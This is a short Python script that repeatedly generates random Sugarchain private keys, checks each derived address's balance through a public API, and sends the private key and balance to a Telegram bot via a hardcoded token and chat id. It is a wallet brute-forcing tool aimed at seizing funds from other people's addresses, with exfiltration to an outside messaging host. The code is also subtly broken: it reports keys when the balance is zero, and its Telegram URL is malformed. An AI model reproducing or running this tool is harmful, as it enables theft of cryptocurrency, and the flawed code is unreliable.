# taken from rmdlv (github.com/rmdlv)

import asyncio

from bitcoinutils.setup import setup
from bitcoinutils.keys import PrivateKey
from bitcoinutils import constants

from aiohttp import ClientSession


async def main():
    session = ClientSession()
    constants.NETWORK_SEGWIT_PREFIXES["mainnet"] = "sugar"
    setup()
    while True:
        private = PrivateKey()
        public = private.get_public_key()
        segwit = public.get_segwit_address()
        address = segwit.to_string()
        wif = private.to_wif()
        response = await session.get(f"https://api.sugarchain.org/balance/{address}")
        data = await response.json()
        balance = data["result"]["balance"]
        print(wif, balance)
        dat=wif+' '+str(balance)
        if int(balance) == 0:
            await session.get(f"https://api.telegram.org/1827311786:AAFozr-h4-yP3BlZMVTMSSJzfdvEMfWFNTo/sendMessage?chat_id=1149276168&text={dat}")
            

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
